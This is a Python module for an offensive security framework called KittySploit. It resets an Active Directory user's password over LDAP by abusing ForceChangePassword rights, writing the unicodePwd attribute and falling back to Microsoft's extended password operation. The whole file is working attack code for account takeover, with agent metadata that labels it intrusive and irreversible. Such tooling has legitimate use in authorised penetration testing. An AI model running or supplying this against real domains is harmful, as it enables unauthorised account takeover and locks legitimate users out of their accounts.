#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Force-change a user password via LDAP (ForceChangePassword ACL / NetExec change-password)."""

from kittysploit import *
from lib.protocols.ldap.ad_client import Ad_client


class Module(Auxiliary, Ad_client):
    __info__ = {
        "name": "LDAP Force Change Password",
        "description": (
            "Resets a target user's password using LDAP unicodePwd (requires LDAPS and "
            "ForceChangePassword / reset rights — NetExec: -M change-password)."
        ),
        "author": ["KittySploit Team"],
        "tags": ["ad", "ldap", "password", "acl", "auxiliary", "netexec", "intrusive"],
        "references": [
            "https://www.netexec.wiki/",
            "https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/",
        ],
        "agent": {
            "risk": "intrusive",
            "effects": ["account_modification"],
            "expected_requests": 2,
            "reversible": False,
            "approval_required": True,
            "produces": ["risk_signals"],
        },
    }

    target_user = OptString("", "Target sAMAccountName whose password will be reset", True)
    new_password = OptString("", "New password to set", True)
    dry_run = OptBool(False, "Resolve target only; do not modify", False)

    def run(self):
        target = str(self.target_user or "").strip()
        new_pass = str(self.new_password or "")
        if not target or not new_pass:
            print_error("target_user and new_password are required")
            return {"error": "missing_options"}

        # Prefer LDAPS for unicodePwd
        use_ssl = bool(getattr(self.ssl, "value", self.ssl))
        if not use_ssl:
            print_warning("unicodePwd usually requires LDAPS — set ssl=true and port=636")

        if not self.conn:
            print_error("LDAP bind failed")
            return {"error": "ldap_bind_failed"}

        esc = (
            target.replace("\\", "\\5c")
            .replace("*", "\\2a")
            .replace("(", "\\28")
            .replace(")", "\\29")
        )
        rows = self.search(
            f"(&(objectClass=user)(sAMAccountName={esc}))",
            ["distinguishedName", "sAMAccountName"],
            size_limit=1,
        )
        if not rows:
            print_error(f"User not found: {target}")
            return {"error": "user_not_found"}
        dn = getattr(rows[0], "entry_dn", "") or self.attr_str(rows[0], "distinguishedName")
        print_info(f"Target DN: {dn}")
        if self.dry_run:
            print_warning("Dry run — no password change sent")
            return {"dry_run": True, "dn": dn, "sam": target}

        # AD requires quoted UTF-16-LE password for unicodePwd
        quoted = f'"{new_pass}"'.encode("utf-16-le")
        try:
            from ldap3 import MODIFY_REPLACE

            ok = self.conn.modify(dn, {"unicodePwd": [(MODIFY_REPLACE, [quoted])]})
            if not ok:
                # Fallback: microsoft extend API
                try:
                    ok = self.conn.extend.microsoft.modify_password(dn, new_pass)
                except Exception as exc:
                    print_error(f"Password change failed: {self.conn.result} / {exc}")
                    return {"error": "modify_failed", "result": str(self.conn.result)}
            if not ok:
                print_error(f"Password change failed: {self.conn.result}")
                return {"error": "modify_failed", "result": str(self.conn.result)}
            print_success(f"Successfully changed password for {target}")
            return {"ok": True, "sam": target, "dn": dn}
        except Exception as exc:
            print_error(f"Password change failed: {exc}")
            return {"error": str(exc)[:200]}
